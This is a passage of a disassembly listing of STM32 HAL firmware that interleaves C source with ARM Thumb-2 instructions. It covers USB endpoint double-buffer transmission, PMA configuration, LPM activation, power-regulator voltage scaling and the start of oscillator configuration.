 80034fa:	d108      	bne.n	800350e <HAL_PCD_EP_DB_Transmit+0x658>
        {
          len = TxPctSize;
 80034fc:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003500:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 8003504:	68bb      	ldr	r3, [r7, #8]
 8003506:	2200      	movs	r2, #0
 8003508:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 800350c:	e00a      	b.n	8003524 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else
        {
          len = ep->xfer_len_db;
 800350e:	68bb      	ldr	r3, [r7, #8]
 8003510:	6a1b      	ldr	r3, [r3, #32]
 8003512:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 8003516:	68bb      	ldr	r3, [r7, #8]
 8003518:	2200      	movs	r2, #0
 800351a:	621a      	str	r2, [r3, #32]
          ep->xfer_fill_db = 0;
 800351c:	68bb      	ldr	r3, [r7, #8]
 800351e:	2200      	movs	r2, #0
 8003520:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
        }

        /* Set the Double buffer counter for pmabuffer1 */
        PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 8003524:	68fb      	ldr	r3, [r7, #12]
 8003526:	681b      	ldr	r3, [r3, #0]
 8003528:	657b      	str	r3, [r7, #84]	; 0x54
 800352a:	68bb      	ldr	r3, [r7, #8]
 800352c:	785b      	ldrb	r3, [r3, #1]
 800352e:	2b00      	cmp	r3, #0
 8003530:	d165      	bne.n	80035fe <HAL_PCD_EP_DB_Transmit+0x748>
 8003532:	68fb      	ldr	r3, [r7, #12]
 8003534:	681b      	ldr	r3, [r3, #0]
 8003536:	65fb      	str	r3, [r7, #92]	; 0x5c
 8003538:	68fb      	ldr	r3, [r7, #12]
 800353a:	681b      	ldr	r3, [r3, #0]
 800353c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003540:	b29b      	uxth	r3, r3
 8003542:	461a      	mov	r2, r3
 8003544:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8003546:	4413      	add	r3, r2
 8003548:	65fb      	str	r3, [r7, #92]	; 0x5c
 800354a:	68bb      	ldr	r3, [r7, #8]
 800354c:	781b      	ldrb	r3, [r3, #0]
 800354e:	00da      	lsls	r2, r3, #3
 8003550:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8003552:	4413      	add	r3, r2
 8003554:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003558:	65bb      	str	r3, [r7, #88]	; 0x58
 800355a:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800355c:	881b      	ldrh	r3, [r3, #0]
 800355e:	b29b      	uxth	r3, r3
 8003560:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003564:	b29a      	uxth	r2, r3
 8003566:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003568:	801a      	strh	r2, [r3, #0]
 800356a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800356e:	2b3e      	cmp	r3, #62	; 0x3e
 8003570:	d91d      	bls.n	80035ae <HAL_PCD_EP_DB_Transmit+0x6f8>
 8003572:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003576:	095b      	lsrs	r3, r3, #5
 8003578:	66bb      	str	r3, [r7, #104]	; 0x68
 800357a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800357e:	f003 031f 	and.w	r3, r3, #31
 8003582:	2b00      	cmp	r3, #0
 8003584:	d102      	bne.n	800358c <HAL_PCD_EP_DB_Transmit+0x6d6>
 8003586:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003588:	3b01      	subs	r3, #1
 800358a:	66bb      	str	r3, [r7, #104]	; 0x68
 800358c:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800358e:	881b      	ldrh	r3, [r3, #0]
 8003590:	b29a      	uxth	r2, r3
 8003592:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003594:	b29b      	uxth	r3, r3
 8003596:	029b      	lsls	r3, r3, #10
 8003598:	b29b      	uxth	r3, r3
 800359a:	4313      	orrs	r3, r2
 800359c:	b29b      	uxth	r3, r3
 800359e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80035a2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80035a6:	b29a      	uxth	r2, r3
 80035a8:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035aa:	801a      	strh	r2, [r3, #0]
 80035ac:	e041      	b.n	8003632 <HAL_PCD_EP_DB_Transmit+0x77c>
 80035ae:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035b2:	2b00      	cmp	r3, #0
 80035b4:	d10a      	bne.n	80035cc <HAL_PCD_EP_DB_Transmit+0x716>
 80035b6:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035b8:	881b      	ldrh	r3, [r3, #0]
 80035ba:	b29b      	uxth	r3, r3
 80035bc:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80035c0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80035c4:	b29a      	uxth	r2, r3
 80035c6:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035c8:	801a      	strh	r2, [r3, #0]
 80035ca:	e032      	b.n	8003632 <HAL_PCD_EP_DB_Transmit+0x77c>
 80035cc:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035d0:	085b      	lsrs	r3, r3, #1
 80035d2:	66bb      	str	r3, [r7, #104]	; 0x68
 80035d4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035d8:	f003 0301 	and.w	r3, r3, #1
 80035dc:	2b00      	cmp	r3, #0
 80035de:	d002      	beq.n	80035e6 <HAL_PCD_EP_DB_Transmit+0x730>
 80035e0:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80035e2:	3301      	adds	r3, #1
 80035e4:	66bb      	str	r3, [r7, #104]	; 0x68
 80035e6:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035e8:	881b      	ldrh	r3, [r3, #0]
 80035ea:	b29a      	uxth	r2, r3
 80035ec:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80035ee:	b29b      	uxth	r3, r3
 80035f0:	029b      	lsls	r3, r3, #10
 80035f2:	b29b      	uxth	r3, r3
 80035f4:	4313      	orrs	r3, r2
 80035f6:	b29a      	uxth	r2, r3
 80035f8:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035fa:	801a      	strh	r2, [r3, #0]
 80035fc:	e019      	b.n	8003632 <HAL_PCD_EP_DB_Transmit+0x77c>
 80035fe:	68bb      	ldr	r3, [r7, #8]
 8003600:	785b      	ldrb	r3, [r3, #1]
 8003602:	2b01      	cmp	r3, #1
 8003604:	d115      	bne.n	8003632 <HAL_PCD_EP_DB_Transmit+0x77c>
 8003606:	68fb      	ldr	r3, [r7, #12]
 8003608:	681b      	ldr	r3, [r3, #0]
 800360a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800360e:	b29b      	uxth	r3, r3
 8003610:	461a      	mov	r2, r3
 8003612:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8003614:	4413      	add	r3, r2
 8003616:	657b      	str	r3, [r7, #84]	; 0x54
 8003618:	68bb      	ldr	r3, [r7, #8]
 800361a:	781b      	ldrb	r3, [r3, #0]
 800361c:	00da      	lsls	r2, r3, #3
 800361e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8003620:	4413      	add	r3, r2
 8003622:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003626:	653b      	str	r3, [r7, #80]	; 0x50
 8003628:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800362c:	b29a      	uxth	r2, r3
 800362e:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8003630:	801a      	strh	r2, [r3, #0]

        /* Copy the user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr1, (uint16_t)len);
 8003632:	68fb      	ldr	r3, [r7, #12]
 8003634:	6818      	ldr	r0, [r3, #0]
 8003636:	68bb      	ldr	r3, [r7, #8]
 8003638:	6959      	ldr	r1, [r3, #20]
 800363a:	68bb      	ldr	r3, [r7, #8]
 800363c:	895a      	ldrh	r2, [r3, #10]
 800363e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003642:	b29b      	uxth	r3, r3
 8003644:	f004 fee7 	bl	8008416 <USB_WritePMA>
      }
    }
  }

  /*enable endpoint IN*/
  PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_VALID);
 8003648:	68fb      	ldr	r3, [r7, #12]
 800364a:	681b      	ldr	r3, [r3, #0]
 800364c:	461a      	mov	r2, r3
 800364e:	68bb      	ldr	r3, [r7, #8]
 8003650:	781b      	ldrb	r3, [r3, #0]
 8003652:	009b      	lsls	r3, r3, #2
 8003654:	4413      	add	r3, r2
 8003656:	881b      	ldrh	r3, [r3, #0]
 8003658:	b29b      	uxth	r3, r3
 800365a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800365e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8003662:	82bb      	strh	r3, [r7, #20]
 8003664:	8abb      	ldrh	r3, [r7, #20]
 8003666:	f083 0310 	eor.w	r3, r3, #16
 800366a:	82bb      	strh	r3, [r7, #20]
 800366c:	8abb      	ldrh	r3, [r7, #20]
 800366e:	f083 0320 	eor.w	r3, r3, #32
 8003672:	82bb      	strh	r3, [r7, #20]
 8003674:	68fb      	ldr	r3, [r7, #12]
 8003676:	681b      	ldr	r3, [r3, #0]
 8003678:	461a      	mov	r2, r3
 800367a:	68bb      	ldr	r3, [r7, #8]
 800367c:	781b      	ldrb	r3, [r3, #0]
 800367e:	009b      	lsls	r3, r3, #2
 8003680:	441a      	add	r2, r3
 8003682:	8abb      	ldrh	r3, [r7, #20]
 8003684:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003688:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800368c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8003690:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003694:	b29b      	uxth	r3, r3
 8003696:	8013      	strh	r3, [r2, #0]

  return HAL_OK;
 8003698:	2300      	movs	r3, #0
}
 800369a:	4618      	mov	r0, r3
 800369c:	3790      	adds	r7, #144	; 0x90
 800369e:	46bd      	mov	sp, r7
 80036a0:	bd80      	pop	{r7, pc}

080036a2 <HAL_PCDEx_PMAConfig>:
  * @retval HAL status
  */

HAL_StatusTypeDef  HAL_PCDEx_PMAConfig(PCD_HandleTypeDef *hpcd, uint16_t ep_addr,
                                       uint16_t ep_kind, uint32_t pmaadress)
{
 80036a2:	b480      	push	{r7}
 80036a4:	b087      	sub	sp, #28
 80036a6:	af00      	add	r7, sp, #0
 80036a8:	60f8      	str	r0, [r7, #12]
 80036aa:	607b      	str	r3, [r7, #4]
 80036ac:	460b      	mov	r3, r1
 80036ae:	817b      	strh	r3, [r7, #10]
 80036b0:	4613      	mov	r3, r2
 80036b2:	813b      	strh	r3, [r7, #8]
  PCD_EPTypeDef *ep;

  /* initialize ep structure*/
  if ((0x80U & ep_addr) == 0x80U)
 80036b4:	897b      	ldrh	r3, [r7, #10]
 80036b6:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80036ba:	b29b      	uxth	r3, r3
 80036bc:	2b00      	cmp	r3, #0
 80036be:	d00b      	beq.n	80036d8 <HAL_PCDEx_PMAConfig+0x36>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80036c0:	897b      	ldrh	r3, [r7, #10]
 80036c2:	f003 0307 	and.w	r3, r3, #7
 80036c6:	1c5a      	adds	r2, r3, #1
 80036c8:	4613      	mov	r3, r2
 80036ca:	009b      	lsls	r3, r3, #2
 80036cc:	4413      	add	r3, r2
 80036ce:	00db      	lsls	r3, r3, #3
 80036d0:	68fa      	ldr	r2, [r7, #12]
 80036d2:	4413      	add	r3, r2
 80036d4:	617b      	str	r3, [r7, #20]
 80036d6:	e009      	b.n	80036ec <HAL_PCDEx_PMAConfig+0x4a>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 80036d8:	897a      	ldrh	r2, [r7, #10]
 80036da:	4613      	mov	r3, r2
 80036dc:	009b      	lsls	r3, r3, #2
 80036de:	4413      	add	r3, r2
 80036e0:	00db      	lsls	r3, r3, #3
 80036e2:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80036e6:	68fa      	ldr	r2, [r7, #12]
 80036e8:	4413      	add	r3, r2
 80036ea:	617b      	str	r3, [r7, #20]
  }

  /* Here we check if the endpoint is single or double Buffer*/
  if (ep_kind == PCD_SNG_BUF)
 80036ec:	893b      	ldrh	r3, [r7, #8]
 80036ee:	2b00      	cmp	r3, #0
 80036f0:	d107      	bne.n	8003702 <HAL_PCDEx_PMAConfig+0x60>
  {
    /* Single Buffer */
    ep->doublebuffer = 0U;
 80036f2:	697b      	ldr	r3, [r7, #20]
 80036f4:	2200      	movs	r2, #0
 80036f6:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaadress = (uint16_t)pmaadress;
 80036f8:	687b      	ldr	r3, [r7, #4]
 80036fa:	b29a      	uxth	r2, r3
 80036fc:	697b      	ldr	r3, [r7, #20]
 80036fe:	80da      	strh	r2, [r3, #6]
 8003700:	e00b      	b.n	800371a <HAL_PCDEx_PMAConfig+0x78>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  else /* USB_DBL_BUF */
  {
    /* Double Buffer Endpoint */
    ep->doublebuffer = 1U;
 8003702:	697b      	ldr	r3, [r7, #20]
 8003704:	2201      	movs	r2, #1
 8003706:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaaddr0 = (uint16_t)(pmaadress & 0xFFFFU);
 8003708:	687b      	ldr	r3, [r7, #4]
 800370a:	b29a      	uxth	r2, r3
 800370c:	697b      	ldr	r3, [r7, #20]
 800370e:	811a      	strh	r2, [r3, #8]
    ep->pmaaddr1 = (uint16_t)((pmaadress & 0xFFFF0000U) >> 16);
 8003710:	687b      	ldr	r3, [r7, #4]
 8003712:	0c1b      	lsrs	r3, r3, #16
 8003714:	b29a      	uxth	r2, r3
 8003716:	697b      	ldr	r3, [r7, #20]
 8003718:	815a      	strh	r2, [r3, #10]
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 800371a:	2300      	movs	r3, #0
}
 800371c:	4618      	mov	r0, r3
 800371e:	371c      	adds	r7, #28
 8003720:	46bd      	mov	sp, r7
 8003722:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003726:	4770      	bx	lr

08003728 <HAL_PCDEx_ActivateLPM>:
  * @brief  Activate LPM feature.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCDEx_ActivateLPM(PCD_HandleTypeDef *hpcd)
{
 8003728:	b480      	push	{r7}
 800372a:	b085      	sub	sp, #20
 800372c:	af00      	add	r7, sp, #0
 800372e:	6078      	str	r0, [r7, #4]

  USB_TypeDef *USBx = hpcd->Instance;
 8003730:	687b      	ldr	r3, [r7, #4]
 8003732:	681b      	ldr	r3, [r3, #0]
 8003734:	60fb      	str	r3, [r7, #12]
  hpcd->lpm_active = 1U;
 8003736:	687b      	ldr	r3, [r7, #4]
 8003738:	2201      	movs	r2, #1
 800373a:	f8c3 22ec 	str.w	r2, [r3, #748]	; 0x2ec
  hpcd->LPM_State = LPM_L0;
 800373e:	687b      	ldr	r3, [r7, #4]
 8003740:	2200      	movs	r2, #0
 8003742:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0

  USBx->LPMCSR |= USB_LPMCSR_LMPEN;
 8003746:	68fb      	ldr	r3, [r7, #12]
 8003748:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 800374c:	b29b      	uxth	r3, r3
 800374e:	f043 0301 	orr.w	r3, r3, #1
 8003752:	b29a      	uxth	r2, r3
 8003754:	68fb      	ldr	r3, [r7, #12]
 8003756:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54
  USBx->LPMCSR |= USB_LPMCSR_LPMACK;
 800375a:	68fb      	ldr	r3, [r7, #12]
 800375c:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8003760:	b29b      	uxth	r3, r3
 8003762:	f043 0302 	orr.w	r3, r3, #2
 8003766:	b29a      	uxth	r2, r3
 8003768:	68fb      	ldr	r3, [r7, #12]
 800376a:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54

  return HAL_OK;
 800376e:	2300      	movs	r3, #0
}
 8003770:	4618      	mov	r0, r3
 8003772:	3714      	adds	r7, #20
 8003774:	46bd      	mov	sp, r7
 8003776:	f85d 7b04 	ldr.w	r7, [sp], #4
 800377a:	4770      	bx	lr

0800377c <HAL_PWR_EnableBkUpAccess>:
  * @note  LSEON bit that switches on and off the LSE crystal belongs as well to the
  *        back-up domain.
  * @retval None
  */
void HAL_PWR_EnableBkUpAccess(void)
{
 800377c:	b480      	push	{r7}
 800377e:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003780:	4b05      	ldr	r3, [pc, #20]	; (8003798 <HAL_PWR_EnableBkUpAccess+0x1c>)
 8003782:	681b      	ldr	r3, [r3, #0]
 8003784:	4a04      	ldr	r2, [pc, #16]	; (8003798 <HAL_PWR_EnableBkUpAccess+0x1c>)
 8003786:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 800378a:	6013      	str	r3, [r2, #0]
}
 800378c:	bf00      	nop
 800378e:	46bd      	mov	sp, r7
 8003790:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003794:	4770      	bx	lr
 8003796:	bf00      	nop
 8003798:	40007000 	.word	0x40007000

0800379c <HAL_PWREx_GetVoltageRange>:
  * @brief Return Voltage Scaling Range.
  * @retval VOS bit field (PWR_REGULATOR_VOLTAGE_SCALE1 or PWR_REGULATOR_VOLTAGE_SCALE2
  *         or PWR_REGULATOR_VOLTAGE_SCALE1_BOOST when applicable)
  */
uint32_t HAL_PWREx_GetVoltageRange(void)
{
 800379c:	b480      	push	{r7}
 800379e:	af00      	add	r7, sp, #0
    else
    {
      return PWR_REGULATOR_VOLTAGE_SCALE1_BOOST;
    }
#else
  return  (PWR->CR1 & PWR_CR1_VOS);
 80037a0:	4b04      	ldr	r3, [pc, #16]	; (80037b4 <HAL_PWREx_GetVoltageRange+0x18>)
 80037a2:	681b      	ldr	r3, [r3, #0]
 80037a4:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
#endif
}
 80037a8:	4618      	mov	r0, r3
 80037aa:	46bd      	mov	sp, r7
 80037ac:	f85d 7b04 	ldr.w	r7, [sp], #4
 80037b0:	4770      	bx	lr
 80037b2:	bf00      	nop
 80037b4:	40007000 	.word	0x40007000

080037b8 <HAL_PWREx_ControlVoltageScaling>:
  *        cleared before returning the status. If the flag is not cleared within
  *        50 microseconds, HAL_TIMEOUT status is reported.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_PWREx_ControlVoltageScaling(uint32_t VoltageScaling)
{
 80037b8:	b480      	push	{r7}
 80037ba:	b085      	sub	sp, #20
 80037bc:	af00      	add	r7, sp, #0
 80037be:	6078      	str	r0, [r7, #4]
  }

#else

  /* If Set Range 1 */
  if (VoltageScaling == PWR_REGULATOR_VOLTAGE_SCALE1)
 80037c0:	687b      	ldr	r3, [r7, #4]
 80037c2:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80037c6:	d130      	bne.n	800382a <HAL_PWREx_ControlVoltageScaling+0x72>
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE1)
 80037c8:	4b23      	ldr	r3, [pc, #140]	; (8003858 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80037ca:	681b      	ldr	r3, [r3, #0]
 80037cc:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 80037d0:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80037d4:	d038      	beq.n	8003848 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 1 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE1);
 80037d6:	4b20      	ldr	r3, [pc, #128]	; (8003858 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80037d8:	681b      	ldr	r3, [r3, #0]
 80037da:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 80037de:	4a1e      	ldr	r2, [pc, #120]	; (8003858 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80037e0:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 80037e4:	6013      	str	r3, [r2, #0]

      /* Wait until VOSF is cleared */
      wait_loop_index = ((PWR_FLAG_SETTING_DELAY_US * SystemCoreClock) / 1000000U) + 1U;
 80037e6:	4b1d      	ldr	r3, [pc, #116]	; (800385c <HAL_PWREx_ControlVoltageScaling+0xa4>)
 80037e8:	681b      	ldr	r3, [r3, #0]
 80037ea:	2232      	movs	r2, #50	; 0x32
 80037ec:	fb02 f303 	mul.w	r3, r2, r3
 80037f0:	4a1b      	ldr	r2, [pc, #108]	; (8003860 <HAL_PWREx_ControlVoltageScaling+0xa8>)
 80037f2:	fba2 2303 	umull	r2, r3, r2, r3
 80037f6:	0c9b      	lsrs	r3, r3, #18
 80037f8:	3301      	adds	r3, #1
 80037fa:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 80037fc:	e002      	b.n	8003804 <HAL_PWREx_ControlVoltageScaling+0x4c>
      {
        wait_loop_index--;
 80037fe:	68fb      	ldr	r3, [r7, #12]
 8003800:	3b01      	subs	r3, #1
 8003802:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003804:	4b14      	ldr	r3, [pc, #80]	; (8003858 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003806:	695b      	ldr	r3, [r3, #20]
 8003808:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800380c:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003810:	d102      	bne.n	8003818 <HAL_PWREx_ControlVoltageScaling+0x60>
 8003812:	68fb      	ldr	r3, [r7, #12]
 8003814:	2b00      	cmp	r3, #0
 8003816:	d1f2      	bne.n	80037fe <HAL_PWREx_ControlVoltageScaling+0x46>
      }
      if (HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF))
 8003818:	4b0f      	ldr	r3, [pc, #60]	; (8003858 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 800381a:	695b      	ldr	r3, [r3, #20]
 800381c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003820:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003824:	d110      	bne.n	8003848 <HAL_PWREx_ControlVoltageScaling+0x90>
      {
        return HAL_TIMEOUT;
 8003826:	2303      	movs	r3, #3
 8003828:	e00f      	b.n	800384a <HAL_PWREx_ControlVoltageScaling+0x92>
      }
    }
  }
  else
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE2)
 800382a:	4b0b      	ldr	r3, [pc, #44]	; (8003858 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 800382c:	681b      	ldr	r3, [r3, #0]
 800382e:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 8003832:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003836:	d007      	beq.n	8003848 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 2 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE2);
 8003838:	4b07      	ldr	r3, [pc, #28]	; (8003858 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 800383a:	681b      	ldr	r3, [r3, #0]
 800383c:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 8003840:	4a05      	ldr	r2, [pc, #20]	; (8003858 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003842:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8003846:	6013      	str	r3, [r2, #0]
      /* No need to wait for VOSF to be cleared for this transition */
    }
  }
#endif

  return HAL_OK;
 8003848:	2300      	movs	r3, #0
}
 800384a:	4618      	mov	r0, r3
 800384c:	3714      	adds	r7, #20
 800384e:	46bd      	mov	sp, r7
 8003850:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003854:	4770      	bx	lr
 8003856:	bf00      	nop
 8003858:	40007000 	.word	0x40007000
 800385c:	20000000 	.word	0x20000000
 8003860:	431bde83 	.word	0x431bde83

08003864 <HAL_PWREx_EnableVddUSB>:
  * @brief Enable VDDUSB supply.
  * @note  Remove VDDUSB electrical and logical isolation, once VDDUSB supply is present.
  * @retval None
  */
void HAL_PWREx_EnableVddUSB(void)
{
 8003864:	b480      	push	{r7}
 8003866:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR2, PWR_CR2_USV);
 8003868:	4b05      	ldr	r3, [pc, #20]	; (8003880 <HAL_PWREx_EnableVddUSB+0x1c>)
 800386a:	685b      	ldr	r3, [r3, #4]
 800386c:	4a04      	ldr	r2, [pc, #16]	; (8003880 <HAL_PWREx_EnableVddUSB+0x1c>)
 800386e:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8003872:	6053      	str	r3, [r2, #4]
}
 8003874:	bf00      	nop
 8003876:	46bd      	mov	sp, r7
 8003878:	f85d 7b04 	ldr.w	r7, [sp], #4
 800387c:	4770      	bx	lr
 800387e:	bf00      	nop
 8003880:	40007000 	.word	0x40007000

08003884 <HAL_RCC_OscConfig>:
  * @note   If HSE failed to start, HSE should be disabled before recalling
            HAL_RCC_OscConfig().
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCC_OscConfig(RCC_OscInitTypeDef  *RCC_OscInitStruct)
{
 8003884:	b580      	push	{r7, lr}
 8003886:	b088      	sub	sp, #32
 8003888:	af00      	add	r7, sp, #0
 800388a:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;
  HAL_StatusTypeDef status;
  uint32_t sysclk_source, pll_config;

  /* Check Null pointer */
  if(RCC_OscInitStruct == NULL)
 800388c:	687b      	ldr	r3, [r7, #4]
 800388e:	2b00      	cmp	r3, #0
 8003890:	d102      	bne.n	8003898 <HAL_RCC_OscConfig+0x14>
  {
    return HAL_ERROR;
 8003892:	2301      	movs	r3, #1
 8003894:	f000 bc02 	b.w	800409c <HAL_RCC_OscConfig+0x818>
  }

  /* Check the parameters */
  assert_param(IS_RCC_OSCILLATORTYPE(RCC_OscInitStruct->OscillatorType));

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 8003898:	4b96      	ldr	r3, [pc, #600]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 800389a:	689b      	ldr	r3, [r3, #8]
 800389c:	f003 030c 	and.w	r3, r3, #12
 80038a0:	61bb      	str	r3, [r7, #24]
  pll_config = __HAL_RCC_GET_PLL_OSCSOURCE();
 80038a2:	4b94      	ldr	r3, [pc, #592]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 80038a4:	68db      	ldr	r3, [r3, #12]
 80038a6:	f003 0303 	and.w	r3, r3, #3
 80038aa:	617b      	str	r3, [r7, #20]

  /*----------------------------- MSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_MSI) == RCC_OSCILLATORTYPE_MSI)
 80038ac:	687b      	ldr	r3, [r7, #4]
 80038ae:	681b      	ldr	r3, [r3, #0]
 80038b0:	f003 0310 	and.w	r3, r3, #16
 80038b4:	2b00      	cmp	r3, #0
 80038b6:	f000 80e4 	beq.w	8003a82 <HAL_RCC_OscConfig+0x1fe>
    assert_param(IS_RCC_MSI(RCC_OscInitStruct->MSIState));
    assert_param(IS_RCC_MSICALIBRATION_VALUE(RCC_OscInitStruct->MSICalibrationValue));
    assert_param(IS_RCC_MSI_CLOCK_RANGE(RCC_OscInitStruct->MSIClockRange));

    /* Check if MSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 80038ba:	69bb      	ldr	r3, [r7, #24]
 80038bc:	2b00      	cmp	r3, #0
 80038be:	d007      	beq.n	80038d0 <HAL_RCC_OscConfig+0x4c>
 80038c0:	69bb      	ldr	r3, [r7, #24]
 80038c2:	2b0c      	cmp	r3, #12
 80038c4:	f040 808b 	bne.w	80039de <HAL_RCC_OscConfig+0x15a>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_MSI)))
 80038c8:	697b      	ldr	r3, [r7, #20]
 80038ca:	2b01      	cmp	r3, #1
 80038cc:	f040 8087 	bne.w	80039de <HAL_RCC_OscConfig+0x15a>
    {
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 80038d0:	4b88      	ldr	r3, [pc, #544]	; (8003af4 <HAL_RCC_OscConfig+0x270>)
 80038d2:	681b      	ldr	r3, [r3, #0]
 80038d4:	f003 0302 	and.w	r3, r3, #2
 80038d8:	2b00      	cmp	r3, #0
 80038da:	d005      	beq.n	80038e8 <HAL_RCC_OscConfig+0x64>
 80038dc:	687b      	ldr	r3, [r7, #4]
